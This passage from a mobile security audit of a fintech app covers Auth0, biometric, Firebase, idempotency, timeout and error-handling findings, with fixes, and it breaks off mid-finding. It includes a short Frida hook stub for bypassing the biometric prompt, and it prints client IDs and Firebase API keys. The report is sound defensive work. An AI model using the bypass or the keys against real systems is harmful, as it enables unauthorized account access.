3. **`audience: ".../api/v2/"` targets the Auth0 Management API** — a highly privileged audience. If this client were ever granted Management API scopes, obtaining a token for it would permit tenant-level operations (reading/modifying users).
4. **The response is discarded.** `id_token`, `access_token`, and `expires_in` are destructured and never used. Nothing is stored, nothing is dispatched. The screen is non-functional.
5. **Errors are swallowed** in the `.then` and logged raw in the `.catch` — a failed request may write request context to the console.
6. **The screen is not registered in any navigator** — a search of [src/navigation/AppContainer.tsx](src/navigation/AppContainer.tsx) shows no `Login` route. It is unreachable dead code.

The *real* authentication flow is sound by comparison: `Auth0Provider` + `useAuth0().authorize()` ([SplashScreen.tsx:150](src/screens/SplashScreen.tsx#L150)) uses the **Authorization Code flow with PKCE** via `react-native-auth0`, which is the correct choice for a native app.

**Part 2 — Auth0 client IDs across three environments in the bundle.**

```js
// Environment.js
dev:  { issuer: "exchangapay.us.auth0.com",     clientId: "7cpZsKwJutx5HU5lMvqib4eqvYCK0WtO",  audience: "https://ExchangaApi.net" }
prod: { issuer: "exchangapay.eu.auth0.com",     clientId: "0zf1gFmgg6rp3BezUDn1jAimFY5FF3hH",  audience: "https://ExchangaApi.net" }
tst:  { issuer: "exchangapay-tst.eu.auth0.com", clientId: "QN7NMqYHzengFUnmR0HCvenDCSOwGwNs",  audience: "https://ExchangaTstApi.net" }
```

**Important nuance:** for a public OAuth client using PKCE, the `client_id` is **not a secret** — it is transmitted in the authorisation request and is expected to be public. So embedding it is not, by itself, a vulnerability. The concerns are narrower but real:

- **All three environments' identifiers ship in every build**, disclosing the full tenant topology (dev/tst/prod domains, API audiences, and the `enroll offline_access` scope difference on `tst`) to anyone inspecting the bundle. This is reconnaissance value an attacker should not be given for free.
- The `tst` config requests **`offline_access`** (issuing refresh tokens) while `prod` does not — combined with [C-05](#c-05-getallenvdata-hard-returns-the-test-environment-for-every-build), every build gets long-lived refresh tokens from the test tenant.
- **The US-tenant client from `Login.tsx` is a fourth, undocumented client** whose configuration and grant types should be audited — if it permits ROPC or has Management API scopes, it is a genuine liability.
- No `client_secret` appears anywhere, which is correct — but this should be verified in the Auth0 dashboard: the client must be registered as a **Native/public** application with PKCE **required**, not as a confidential client.

#### Attack Scenario

1. Attacker extracts all four client IDs and the tenant domains from the bundle.
2. Attacker queries `https://exchangapay-tst.eu.auth0.com/.well-known/openid-configuration` to enumerate the tenant's endpoints and supported flows.
3. **If any client permits ROPC** (which `Login.tsx` suggests was at least attempted), the attacker mounts credential-stuffing directly against `/oauth/token` — bypassing any rate limiting or bot protection on the hosted login page, and bypassing MFA if the client is not configured to enforce it on that grant.
4. **If the US-tenant client has Management API scopes**, a successful token acquisition permits user enumeration or modification at the tenant level.
5. If `Login.tsx` is ever wired into a navigator (a one-line change a future developer might make, seeing an unused "Login" screen), the app begins handling raw passwords and sending them to a Management API audience.

#### Risk Impact

- **Reconnaissance:** Full disclosure of the Auth0 tenant topology across all environments.
- **Credential stuffing:** Direct endpoint access if ROPC is enabled on any client.
- **Privilege escalation:** Management API audience exposure if scopes are granted.
- **Latent regression:** A password-handling screen sitting in the codebase awaiting accidental activation.

#### Exploitation Possibility

**Medium.** Depends heavily on the Auth0 tenant configuration, which must be verified — the client-side evidence alone establishes the exposure, not the exploitability.

#### Recommended Fix

1. **Delete `src/screens/Login/Login.tsx` entirely.** The real flow is `useAuth0().authorize()`. There is no reason for a second, password-handling login screen to exist.
2. **Audit the Auth0 tenant configuration** — this is the critical action:
   - Confirm every client is registered as **Native (public)** with **PKCE required** and **`client_secret` not issued**.
   - **Disable the Password / ROPC grant** on all clients (Auth0 Dashboard → Application → Advanced Settings → Grant Types).
   - Identify the `gbWLk6GbZAayAlwuHc9tPa0hPnkC1FIk` client on the US tenant, verify its grants and audiences, and **delete it** if unused.
   - Verify no client is authorised for the Management API audience.
   - Enable **Attack Protection**: brute-force protection, suspicious IP throttling, and breached-password detection.
3. **Ship only the active environment's config.** Once [C-05](#c-05-getallenvdata-hard-returns-the-test-environment-for-every-build) is fixed with build-time environment selection, `Environment.js` should contain only the resolved environment's values — not all three. Use `react-native-config` so dev/tst identifiers never reach a production bundle.
4. **Align scopes across environments.** `tst` requests `enroll offline_access` while `prod` does not. Decide deliberately whether refresh tokens are wanted in production (they are needed for [`checkAndRefreshToken`](src/utils/helpers/index.tsx#L914) to function at all — so `prod` currently requesting no `offline_access` means token refresh silently cannot work in a correctly-configured production build). This is a functional bug hiding behind the C-05 misconfiguration.
5. **Enforce MFA at the Auth0 tenant level** for all users, so it cannot be bypassed by using a different grant or client.

#### Best Practice Recommendation

Native apps should use exactly one authentication path: Authorization Code + PKCE through the system browser (which `react-native-auth0` does correctly). Any code that touches a raw password in a native app is a design error. Keep environment configuration out of the bundle entirely — inject it at build time so a production binary contains no knowledge that dev and test tenants exist.

---

### H-14 — Biometric Gate Is Client-Side Navigation Only

| | |
|---|---|
| **Severity** | 🟠 **HIGH** |
| **CWE** | CWE-287 (Improper Authentication), CWE-603 (Use of Client-Side Authentication) |
| **MASVS** | MASVS-AUTH-2, MASVS-AUTH-3 |
| **OWASP Mobile Top 10** | M1 — Improper Credential Usage, M6 — Inadequate Privacy Controls |
| **Files** | [src/hooks/useCheckBio.tsx](src/hooks/useCheckBio.tsx), [src/screens/Profile/Security.tsx:113-130](src/screens/Profile/Security.tsx#L113-L130) |

#### Technical Explanation

The biometric unlock is implemented entirely as a navigation decision, with no cryptographic binding to anything:

```tsx
// src/hooks/useCheckBio.tsx
const checkBio = async () => {
    if (userInfo.isFaceRecognition) {                    // ← flag from Redux
        rnBiometrics.isSensorAvailable().then((resultObject) => {
            const { available } = resultObject;
            if (available) {
                rnBiometrics.simplePrompt({ promptMessage: 'Confirm fingerprint' })
                    .then((resultObject) => {
                        const { success } = resultObject;   // ← a boolean
                        if (success) {
                            navigation.dispatch(CommonActions.reset({
                                index: 1, routes: [{ name: "Dashboard" }],
                            }));
                        } else {
                            setIsLocedModelOpen(true);
                        }
                    })
                    .catch(() => { });                      // ← failure silently ignored
            }
            else {
                // ← NO BIOMETRIC HARDWARE = STRAIGHT TO DASHBOARD
                navigation.dispatch(CommonActions.reset({
                    index: 1, routes: [{ name: "Dashboard" }],
                }));
                setIsLoading(false);
            }
        });
    } else {
        // ← BIOMETRICS DISABLED = STRAIGHT TO DASHBOARD
        navigation.dispatch(CommonActions.reset({
            index: 1, routes: [{ name: "Dashboard" }],
        }));
        setIsLoading(false);
    }
}
```

The failure modes:

1. **`simplePrompt` is decorative.** `react-native-biometrics` offers `createSignature()` — which uses a hardware-backed key pair, requires biometric authentication to sign, and produces a signature the **server can verify**. `simplePrompt()` merely returns `{success: boolean}` from the OS with no cryptographic artefact. A hooked or patched client returns `true` unconditionally. The library is installed and its secure API is available; the insecure one was chosen.
2. **No sensor available ⇒ full access.** The `else` branch navigates straight to `Dashboard`. An attacker on a device with no enrolled biometrics — or who disables biometrics in device settings — bypasses the gate entirely.
3. **`.catch(() => {})` swallows errors.** A thrown error leaves the user on the current screen (fails closed by accident, not by design), but nothing is logged or surfaced.
4. **The gate is `userInfo.isFaceRecognition`, read from Redux** — which is persisted unencrypted ([H-05](#h-05--redux-persist-encryption-transform-is-disabled)) and hookable. Flipping it to `false` skips the prompt.
5. **The session is already fully authenticated before the prompt.** By the time `checkBio()` runs, [`getMemDetails`](src/hooks/useMemberLogin.tsx#L60) has already completed and the bearer token is in the Keychain. The biometric gate protects *the UI*, not *the session* — an attacker who never opens the app can still use the token extracted from storage ([H-11](#h-11--keychain-entries-stored-without-access-control-or-biometric-binding)).
6. **No re-authentication for sensitive operations.** Card PIN reveal ([showPin.tsx](src/screens/Tlv_Cards/showPin.tsx)), card detail display, crypto withdrawal, and password change require no biometric step-up — the app-open prompt is the only biometric interaction in the entire application.
7. **No inactivity timeout.** Nothing re-locks the app after backgrounding or idle time; `checkBio` runs only via `isOnboarding` on the splash path ([SplashScreen.tsx:135-139](src/screens/SplashScreen.tsx#L135-L139)).

Note the naming inconsistency: the flag is `isFaceRecognition` but the prompt says `'Confirm fingerprint'` — cosmetic, but indicative of how little attention this path received.

#### Attack Scenario

**Scenario A — Frida hook (2 lines).**
```js
Java.perform(() => {
  // or hook the JS bridge method directly
  const M = Java.use("com.rnbiometrics.ReactNativeBiometrics");
  M.simplePrompt.implementation = function (...args) { /* return success */ };
});
```
With no root detection ([H-04](#h-04--no-rootjailbreak-detection-or-device-attestation)) and no obfuscation ([C-08](#c-08--proguardr8-disabled-no-code-obfuscation)), this takes minutes.

**Scenario B — Disable biometrics in device settings.** The user's device has biometrics enrolled; an attacker with the unlocked device removes the enrolment (or uses a device where none is enrolled). `isSensorAvailable()` returns `available: false` → **the `else` branch grants access**.

**Scenario C — Bundle patch.** Modify `checkBio` to always take the success branch, repackage, sign with the **known debug key** ([C-03](#c-03--release-builds-are-signed-with-the-committed-debug-keystore)), install as an update.

**Scenario D — Bypass the app entirely.** Extract the bearer token from the Keychain ([H-11](#h-11--keychain-entries-stored-without-access-control-or-biometric-binding)) and call the API directly with `curl`. The biometric gate is irrelevant — it never touched the token.

#### Risk Impact

- **Authentication:** The app-lock provides no assurance against any attacker with device access or basic tooling.
- **Sensitive operations:** Card PIN/PAN reveal and crypto withdrawal have no step-up authentication whatsoever.
- **Compliance:** PSD2 SCA and general strong-customer-authentication expectations are not met by a client-side boolean.

#### Exploitation Possibility

**High.** Scenario B requires no tools at all.

#### Recommended Fix

1. **Switch to signature-based biometrics.** `react-native-biometrics` supports the correct pattern — generate a hardware-backed key pair, register the public key with the backend, and require a **server-verified signature** for the operations that matter:
   ```ts
   // one-time enrolment
   const { publicKey } = await rnBiometrics.createKeys();
   await SecurityService.registerBiometricKey({ publicKey });

   // per sensitive operation
   const nonce = await SecurityService.getChallenge();          // server-issued
   const payload = `${nonce}:${userId}:${Date.now()}`;
   const { success, signature } = await rnBiometrics.createSignature({
     promptMessage: "Confirm withdrawal",
     payload,
   });
   if (!success) return;
   // server verifies signature against the registered public key
   await CryptoServices.withdraw({ ...body, biometricSignature: signature, payload });
   ```
   The key is generated with `setUserAuthenticationRequired`, so the OS enforces biometric presence at signing time and the **server** — not the client — decides whether authentication occurred.
2. **Fail closed when no sensor is available.** Replace the `else` branch's navigation to `Dashboard` with a device-passcode fallback (`ACCESS_CONTROL.DEVICE_PASSCODE`) or a re-authentication prompt. Never treat "cannot check" as "check passed."
3. **Bind the biometric to the credential.** Store the refresh token under `ACCESS_CONTROL.BIOMETRY_CURRENT_SET` ([H-11](#h-11--keychain-entries-stored-without-access-control-or-biometric-binding)) so the OS enforces biometric presence before the token can even be read. This is what makes the gate real rather than cosmetic — Scenario D stops working.
4. **Add step-up authentication** before: card PIN reveal, card PAN/CVV display, crypto withdrawal confirmation, payee/address-book addition, password change, and 2FA settings changes.
5. **Add an inactivity lock.** Re-prompt after N minutes of background time using an `AppState` listener:
   ```tsx
   useEffect(() => {
     const sub = AppState.addEventListener("change", (s) => {
       if (s === "background") backgroundedAt.current = Date.now();
       if (s === "active" && Date.now() - backgroundedAt.current > 120_000) requireBiometric();
     });
     return () => sub.remove();
   }, []);
   ```
6. **Handle `BIOMETRY_CURRENT_SET` invalidation** — if an attacker enrols their own fingerprint, the key must be invalidated and full re-authentication required.
7. **Fix `.catch(() => {})`** to surface the error and remain locked.

#### Best Practice Recommendation

Biometric authentication should always produce a verifiable artefact — a signature over a server-issued challenge, or the unlocking of a hardware-bound key. A boolean returned to JavaScript is a UX affordance, not an authentication control. For financial operations, pair biometric step-up with server-side transaction signing so the backend can independently confirm that the authorised user approved *this specific transaction*.

---

### H-15 — Firebase Configuration Files Committed, Pointing at the Test Project

| | |
|---|---|
| **Severity** | 🟠 **HIGH** |
| **CWE** | CWE-540 (Inclusion of Sensitive Information in Source Code), CWE-1188 |
| **MASVS** | MASVS-STORAGE-1, MASVS-CODE-4 |
| **OWASP Mobile Top 10** | M8 — Security Misconfiguration |
| **Files** | [android/app/google-services.json](android/app/google-services.json), [ios/GoogleService-Info.plist](ios/GoogleService-Info.plist) — both tracked in git |

#### Technical Explanation

Both Firebase configuration files are committed:

| Field | Android | iOS |
|---|---|---|
| `project_id` | `exchangapay-tst-f570a` | `exchangapay-tst-f570a` |
| App ID | `1:244135463456:android:5b3f8e969edb943025ca45` | `1:244135463456:ios:cd3a5f8b9d55af5025ca45` |
| API key | `AIzaSyB720SuBPKNxHNWKkV61k9fPIuAH-dppp8` | `AIzaSyDWH5MT7WMIrV5-TFWjPfscYWEX3BLtnEs` |

**Important calibration:** Firebase API keys are **not secrets** in the conventional sense. Google documents them as identifiers, not credentials — they identify the Firebase project to Google's servers and are expected to appear in client applications. Access control for Firebase services is enforced by **Security Rules** and **App Check**, not by key confidentiality. So the mere presence of these files in a client binary is normal and expected.

The findings here are therefore narrower, but each is real:

**1. The configuration is for the TEST project (`exchangapay-tst-f570a`).**
This is the third independent confirmation of [C-05](#c-05-getallenvdata-hard-returns-the-test-environment-for-every-build) (alongside the `applicationId com.exchangapay.tst` and the `tst` Auth0 placeholders). Every build — including any intended as production — reports crashes to the test Crashlytics project and receives push notifications through the test FCM sender. Given [C-07](#c-07--bearer-tokens-and-full-requestresponse-bodies-shipped-to-crashlytics) sends bearer tokens and full API payloads to Crashlytics, **real customer tokens and PII are flowing into a test-tier Firebase project**, which typically has broader team access and weaker data-handling controls than production.

**2. Committing them prevents per-environment configuration.**
Because there is exactly one `google-services.json` at `android/app/` and one `GoogleService-Info.plist` in the iOS target, there is no mechanism to select a different Firebase project per build variant. This is the structural reason C-05 exists at the Firebase layer, and it must be fixed with build variants regardless of anything else.

**3. Unrestricted API keys enable quota abuse.**
The `current_key` values grant access to whichever Google Cloud APIs are enabled on the project. If **API key restrictions** are not configured in the Google Cloud Console (Application restrictions → Android apps with package name + SHA-1, or iOS apps with bundle ID; API restrictions → only the APIs actually needed), an attacker can use the keys from any client to consume project quota or reach unintended APIs. Given [C-03](#c-03--release-builds-are-signed-with-the-committed-debug-keystore), the SHA-1 restriction is also weakened — the attacker knows the signing certificate, so an app-restriction on package name + SHA-1 does not exclude them.

**4. No App Check.**
There is no `firebase-appcheck` dependency and no App Check initialisation in [App.tsx](App.tsx) or [MainApplication.kt](android/app/src/main/java/com/exchangapay/app/MainApplication.kt). App Check is the control that attests requests originate from a genuine, unmodified app instance — it is the Firebase-layer equivalent of the Play Integrity recommendation in [H-04](#h-04--no-rootjailbreak-detection-or-device-attestation). Without it, and with the sender ID and API keys public, an attacker can interact with Firebase services as if they were the app.

**5. FCM sender ID exposure + push notification handling.**
Project number `244135463456` is the FCM sender ID. Push messages themselves require the **server key** (not present in these files — correctly), so an attacker cannot send pushes with this alone. However, the app's notification handling is loose: [AppContainer.tsx:145-152](src/navigation/AppContainer.tsx#L145-L152) passes `detail.notification?.body` directly into a file path (see [M-05](#m-05--push-notification-body-used-directly-as-a-file-path)), and [index.js:11-21](index.js#L11-L21) reads `remoteMessage?.notification?.title === "Support Chat"` to increment a counter. Any weakness in the FCM server key's protection converts these into real vulnerabilities.

#### Attack Scenario

**Scenario A — Test-project data exposure (the primary concern).** Real customer bearer tokens, request bodies, and PII arrive in `exchangapay-tst-f570a` Crashlytics. This project, being a test tier, likely grants access to the full engineering team and contractors, has no data-retention policy, and is not covered by whatever production access controls exist. The result is a large, under-governed store of production credentials and PII.

**Scenario B — Quota abuse / unintended API access.** If key restrictions are absent, an attacker uses the extracted keys to consume Firebase quota (denial of wallet) or to reach other Google APIs enabled on the project.

**Scenario C — Firebase service access without App Check.** An attacker constructs requests to Firestore/Storage/Functions (if used) impersonating the app. Whether this succeeds depends entirely on Security Rules — which must be reviewed.

#### Risk Impact

- **Confidentiality/Compliance:** Production credentials and PII in a test-tier project with wider access — GDPR Art. 32 and internal data-governance failure.
- **Availability/Cost:** Quota abuse if key restrictions are unset.
- **Integrity:** No attestation that Firebase traffic originates from a genuine app instance.

#### Exploitation Possibility

**Medium.** Scenario A is not an attack — it is the current state, and is the reason this is rated High. Scenarios B and C depend on console-side configuration that must be verified.

#### Recommended Fix

1. **Set up per-variant Firebase configuration** — this is the structural fix:
   - **Android:** create product flavours and place each project's file at `android/app/src/dev/google-services.json`, `src/tst/…`, `src/prod/…`.
   - **iOS:** add a build phase script that copies the correct `GoogleService-Info-<config>.plist` into the bundle based on the active configuration.
   - Create a **separate production Firebase project** if one does not exist.
2. **Apply API key restrictions** in Google Cloud Console for every key:
   - Application restrictions → Android apps (package name + release SHA-1) / iOS apps (bundle ID).
   - API restrictions → only the APIs actually used (FCM, Crashlytics, Installations).
   Note this must be redone once the release keystore is regenerated per [C-03](#c-03--release-builds-are-signed-with-the-committed-debug-keystore).
3. **Enable Firebase App Check** with Play Integrity (Android) and App Attest (iOS) providers, and enforce it on all Firebase services in use.
4. **Review Firebase Security Rules** for any Firestore/Storage/RTDB usage. Default-deny, then allow narrowly.
5. **Restrict Firebase console access** on the test project, and — after fixing [C-07](#c-07--bearer-tokens-and-full-requestresponse-bodies-shipped-to-crashlytics) — **purge existing Crashlytics data** containing tokens and PII.
6. **Decide on committing these files.** Since they are not secrets, committing per-variant copies is defensible and simplifies builds. If you prefer not to, inject them from CI secrets. Either way, remove the current single-copy arrangement.
7. **Rotate the API keys** after applying restrictions, as a hygiene measure — they have been in a shared repository and their exposure history is unknown.

#### Best Practice Recommendation

Firebase project separation should mirror environment separation exactly: distinct projects for dev/test/prod, distinct API keys with tight application and API restrictions, App Check enforced everywhere, and console access granted per-project on a least-privilege basis. Treat the test project as if it will eventually receive production data by accident — because, as this audit shows, it already has.

---
## 4. Medium Findings

---

### M-01 — `getUserInfo()` Is Never Awaited in the Error Interceptor

| | |
|---|---|
| **Severity** | 🟡 **MEDIUM** (correctness bug with security-logging impact) |
| **CWE** | CWE-670 (Always-Incorrect Control Flow Implementation) |
| **Files** | [src/utils/ApiService.ts:27](src/utils/ApiService.ts#L27), [:74](src/utils/ApiService.ts#L74), [:78](src/utils/ApiService.ts#L78) |

**Technical explanation.** `getUserInfo` is declared `async` (returning `Promise<string | null>`) but is called without `await` in two places:

```ts
const logApiErrorToSentry = async (error: any) => {
  const userInfo: any = getUserInfo();          // ← Promise, not the value
  Sentry.withScope(scope => {
    scope.setUser({ id: userInfo?.id ?? 'unknown_user' });   // always 'unknown_user'
```
```ts
const handleErrorCapture = () => async (error: any) => {
  const userInfo: any = getUserInfo();          // ← Promise, not the value
  crashlytics().setUserId(userInfo.userId ?? "unknown");     // always "unknown"
```

Because `userInfo` is a `Promise`, `userInfo.id` and `userInfo.userId` are both `undefined`, so every error event is attributed to `unknown_user`/`unknown`. The `: any` annotation suppresses the TypeScript error that would otherwise catch this.

Note also the **return type is wrong**: `getUserInfo` is annotated `Promise<string | null>` but returns the parsed object (`JSON.parse(credentials.password)`), not a string.

**Exploitation possibility.** Not directly exploitable — but it means **error telemetry cannot be correlated to users**, which degrades incident response. Paradoxically it is currently a small privacy benefit (no user IDs are transmitted), which will disappear the moment the bug is fixed — so fix it *together with* the [C-07](#c-07--bearer-tokens-and-full-requestresponse-bodies-shipped-to-crashlytics) scrubbing work, not before.

**Recommended fix.**
```ts
const getUserInfo = async (): Promise<Record<string, any> | null> => { /* … */ };

const handleErrorCapture = () => async (error: any) => {
  const userInfo = await getUserInfo();
  crashlytics().setUserId(userInfo?.userId ?? "unknown");
```
Also `await getUserInfo()` inside `logApiErrorToSentry` before entering `Sentry.withScope`.

**Best practice.** Remove the `: any` annotations that mask this class of error, and enable `@typescript-eslint/no-floating-promises` and `no-misused-promises` — both would catch this statically. See [L-06](#l-06--no-eslint-configuration-despite-a-lint-script).

---

### M-02 — Idempotency Keys Use a Non-Cryptographic Hash of Predictable Inputs

| | |
|---|---|
| **Severity** | 🟡 **MEDIUM** |
| **CWE** | CWE-328 (Use of Weak Hash), CWE-330 (Use of Insufficiently Random Values), CWE-837 (Improper Enforcement of a Single, Unique Action) |
| **MASVS** | MASVS-CRYPTO-1 |
| **Files** | [src/utils/idempotency.ts](src/utils/idempotency.ts), [src/utils/ApiService.ts:142-155](src/utils/ApiService.ts#L142-L155) |

**Technical explanation.** Idempotency keys for financial operations are derived from a hand-rolled 64-bit FNV-style hash:

```ts
export const fastHash = (str: string): string => {
    let h1 = 0x811c9dc5 >>> 0;
    let h2 = 0x01000193 >>> 0;
    for (let i = 0; i < str.length; i++) {
        const c = str.charCodeAt(i);
        h1 = Math.imul(h1 ^ c, 0x01000193) >>> 0;
        h2 = Math.imul(h2 ^ c, 0x811c9dc5) >>> 0;
    }
    return h1.toString(16).padStart(8, "0") + h2.toString(16).padStart(8, "0");
};
```

Applied to:
```ts
const buildIdempotencyKey = (userId, params, payload) => {
  const parts = [userId];
  params.forEach((key) => { parts.push(String(payload[key] ?? "")); });
  return fastHash(parts.join(":"));
};
```

For the three configured endpoints:
| Endpoint | Key inputs |
|---|---|
| `ExchangeTransaction/Deposit/TopUp` | `userId:cardId:cardNumber:amount` |
| `ExchangeTransaction/Withdraw/Crypto` | `userId:payeeId:amount:walletAddress` |
| `Common/TwoFactorAuthenticationURL` | `userId:payeeId:amount:walletAddress` |

Four problems:

1. **Deterministic, not unique.** Two *legitimate* identical transactions (the same user sending the same amount to the same address twice — a normal thing to do) produce the **same key**. Depending on backend behaviour, the second transaction is silently swallowed as a duplicate. **This is a functional bug that loses real user transactions**, and it is the most likely real-world impact of this finding.
2. **No time or nonce component.** Adding a timestamp or a random nonce (persisted for the retry window) would fix (1) while preserving retry-safety.
3. **Non-cryptographic hash, 64-bit output.** FNV-style hashing has no collision resistance. With a 64-bit output, birthday collisions become plausible at ~2³² keys — and, more importantly, an attacker can **deliberately construct** colliding inputs, since the algorithm is public and reversible-ish. If the backend treats a matching idempotency key as "already processed", a crafted collision could suppress a legitimate transaction (a targeted denial of service against a specific user's withdrawal).
4. **All inputs are attacker-known.** `userId`, `amount`, and `walletAddress` are all values the attacker supplies or can observe (no pinning — [H-03](#h-03--no-certificate-pinning-on-either-platform)). The key adds no unpredictability, so it provides no replay protection whatsoever — it is purely a deduplication token.

The path-matching logic also has a loose case:
```ts
return requestPath === entry.path || requestPath.endsWith(entry.path);
```
`endsWith` could match an unintended path that happens to share a suffix.

**Attack scenario.** An attacker observing a victim's withdrawal (via MITM) recomputes `fastHash("userId:payeeId:amount:walletAddress")` — all values visible in the request — and replays it, or pre-registers the key to cause the victim's genuine withdrawal to be rejected as a duplicate.

**Recommended fix.**
1. **Generate a random UUID per user-initiated action**, persisted for the retry window rather than derived from the payload:
   ```ts
   import { v4 as uuidv4 } from "uuid";       // or QuickCrypto.randomUUID()
   // generated once when the user taps "Confirm", reused only for retries of that same attempt
   const idempotencyKey = uuidv4();
   ```
   This is the standard approach (Stripe, Adyen, and every major payments API) and fixes both the duplicate-transaction bug and the predictability.
2. **If a derived key is required by the backend contract**, use a cryptographic hash with a per-attempt nonce:
   ```ts
   const nonce = Buffer.from(QuickCrypto.randomBytes(16)).toString("hex");
   const key = QuickCrypto.createHash("sha256")
       .update([userId, ...values, nonce].join(":")).digest("hex");
   ```
3. **Anchor the path match** — replace `endsWith` with an exact comparison or a `^`-anchored regex.
4. **Verify backend behaviour.** The client-side key is only meaningful if the server enforces it. Confirm the server: stores keys with a TTL, returns the original response on a repeat, and rejects a repeat with a *different* payload (which is the check that makes idempotency a security control rather than a convenience).

**Best practice.** Idempotency keys should be opaque, random, client-generated per user intent, and scoped to a time window. Never derive them from the payload — that conflates "the same request" with "the same values", which are different things in a payments context.

---

### M-03 — No Request Timeouts or Retry Policy

| | |
|---|---|
| **Severity** | 🟡 **MEDIUM** |
| **CWE** | CWE-1088 (Synchronous Access of Remote Resource without Timeout) |
| **Files** | [src/utils/ApiService.ts:156-161](src/utils/ApiService.ts#L156-L161), [src/utils/api.tsx](src/utils/api.tsx) |

**Technical explanation.** No `timeout` is configured on any HTTP client. A grep for `timeout` across `src/utils/` returns nothing.

```ts
const api = create({ baseURL: getUrl("cardsUrl") });        // no timeout
const uploadapi = create({ baseURL: getUrl("uploadUrl") });  // no timeout
```

`apisauce` defaults to a 0 (infinite) timeout unless one is supplied, and the raw `axios`/`fetch` calls in [chatService.js](src/services/chatService.js), [crypto.tsx:92](src/services/crypto.tsx#L92), and [AppContainer.tsx:130](src/navigation/AppContainer.tsx#L130) have none either.

There is also **no retry policy** — no `axios-retry`, no exponential backoff, and no circuit breaker. Combined with the many `catch {}` blocks that swallow errors ([M-04](#m-04--silent-error-swallowing-throughout-the-codebase)), a hung request leaves a loading spinner on screen indefinitely with no user-visible failure.

**Attack scenario / impact.**
- An attacker in a MITM position (or a degraded network) holds connections open, hanging the app on a loading state. The user has no feedback and no way to recover except force-quitting.
- **Slowloris-style resource exhaustion** on the client: many hung requests accumulate open sockets and pending promises.
- Legitimate impact is more common than malicious: on a poor mobile connection, users see indefinite spinners on the deposit, withdrawal, and KYC screens.

**Recommended fix.**
```ts
const api = create({
  baseURL: getUrl("cardsUrl"),
  timeout: 30000,                    // 30s for normal calls
});
const uploadapi = create({
  baseURL: getUrl("uploadUrl"),
  timeout: 120000,                   // longer for multipart uploads
});
```
Add retry with backoff for **idempotent** methods only (GET, and POSTs that carry an idempotency key per [M-02](#m-02--idempotency-keys-use-a-non-cryptographic-hash-of-predictable-inputs)):
```ts
import axiosRetry from "axios-retry";
axiosRetry(api.axiosInstance, {
  retries: 3,
  retryDelay: axiosRetry.exponentialDelay,
  retryCondition: (e) =>
    axiosRetry.isNetworkError(e) || axiosRetry.isRetryableError(e),
});
```
**Never auto-retry non-idempotent financial POSTs** without a correct idempotency key — doing so risks duplicate withdrawals.

Also surface timeouts to the user: add `408`/`ECONNABORTED` handling in [`isErrorDispaly`](src/utils/helpers/index.tsx#L538) (the `408` message already exists in `ERROR_MESSAGES` but is only reachable via an HTTP status, not a client-side timeout).

**Best practice.** Every network client should have an explicit timeout, a documented retry policy that distinguishes idempotent from non-idempotent operations, and a user-visible failure state. Consolidating the nine scattered base URLs (see [H-03](#h-03--no-certificate-pinning-on-either-platform)) into one configured instance makes this a single change rather than nine.

---

### M-04 — Silent Error Swallowing Throughout the Codebase

| | |
|---|---|
| **Severity** | 🟡 **MEDIUM** |
| **CWE** | CWE-390 (Detection of Error Condition Without Action), CWE-391 (Unchecked Error Condition) |
| **Scope** | Widespread — representative examples below |

**Technical explanation.** Empty or near-empty `catch` blocks appear throughout, including in security-critical paths:

| Location | Swallowed |
|---|---|
| [src/utils/helpers/index.tsx:817](src/utils/helpers/index.tsx#L817) | `storeToken` — **token storage failure is invisible** |
| [src/utils/helpers/index.tsx:945-951](src/utils/helpers/index.tsx#L945-L951) | `checkAndRefreshToken` — **refresh failure ignored**; the `store.dispatch(isSessionExpired(true))` that should fire is commented out |
| [src/utils/helpers/index.tsx:434](src/utils/helpers/index.tsx#L434), [:910](src/utils/helpers/index.tsx#L910) | Keychain read failures → `return null` |
| [src/utils/ApiService.ts:22](src/utils/ApiService.ts#L22), [:66](src/utils/ApiService.ts#L66) | Token/user retrieval failures → `return null` |
| [App.tsx:122](App.tsx#L122), [:153](App.tsx#L153) | Version-check failures → `catch (err) { }` |
| [index.js:21](index.js#L21) | Background message handler → `catch (e) {}` |
| [src/hooks/useCheckBio.tsx:38](src/hooks/useCheckBio.tsx#L38) | **Biometric prompt failure** → `.catch(() => {})` |
| [src/hooks/useTokenRefresh.tsx:38](src/hooks/useTokenRefresh.tsx#L38) | Token-refresh scheduling failure |
| [src/components/sumsub.tsx:57](src/components/sumsub.tsx#L57), [:75](src/components/sumsub.tsx#L75) | KYC completion callbacks |
| [src/hooks/useSendUserWebhook.tsx:36](src/hooks/useSendUserWebhook.tsx#L36) | Webhook failures |

The `checkAndRefreshToken` case is the most consequential:

```ts
} catch (error: any) {
    // This error often occurs if the refresh token is expired or revoked.
    // You should handle this by logging the user out.
    // store.dispatch(isSessionExpired(true));      // ← commented out
}
```

The comment states the correct behaviour and the implementation is disabled. When a refresh token is revoked (e.g. after a password change, or by an admin responding to a compromise), **the app does not log the user out** — it silently continues with a stale token until an API call returns 401, and only then does [`isErrorDispaly`](src/utils/helpers/index.tsx#L563-L566) dispatch `isSessionExpired(true)`. That path works, but it means session revocation is not honoured proactively.

**Impact.**
- **Security-relevant failures are undetectable** — a token that fails to store, a Keychain that is unreadable, a biometric prompt that errors.
- **Debugging is severely hampered** — combined with [M-12](#m-12--production-error-reporting-effectively-disabled) (Sentry disabled), production failures are entirely invisible.
- **Revoked sessions persist** longer than they should.

**Recommended fix.**
1. **Never write an empty catch.** At minimum log with context; for security-relevant paths, take action:
   ```ts
   } catch (error) {
     Sentry.captureException(error, { tags: { area: "token-refresh" } });
     store.dispatch(isSessionExpired(true));      // uncomment — fail closed
   }
   ```
2. **Uncomment the `isSessionExpired` dispatch** in `checkAndRefreshToken`. A failed refresh must end the session.
3. **Make `storeToken` failures fatal to the login flow** — if the token cannot be persisted, the user is not logged in and must be told so.
4. **Enable ESLint `no-empty`** with `allowEmptyCatch: false` to block this at review time (see [L-06](#l-06--no-eslint-configuration-despite-a-lint-script)).
5. **Add a top-level error boundary** so unexpected render errors produce a recoverable screen rather than a white screen. `Sentry.wrap()` provides some of this, but only when Sentry is initialised.

**Best practice.** Errors in authentication, storage, and cryptography paths should fail closed and be reported. Reserve silent catches for genuinely optional operations, and even then leave a debug-level log and a comment explaining why silence is correct.

---

### M-05 — Push Notification Body Used Directly as a File Path

| | |
|---|---|
| **Severity** | 🟡 **MEDIUM** |
| **CWE** | CWE-22 (Path Traversal), CWE-73 (External Control of File Name or Path) |
| **MASVS** | MASVS-PLATFORM-1 |
| **File** | [src/navigation/AppContainer.tsx:141-160](src/navigation/AppContainer.tsx#L141-L160) |

**Technical explanation.** The foreground notification handler concatenates the notification **body** into a filesystem path and opens it:

```tsx
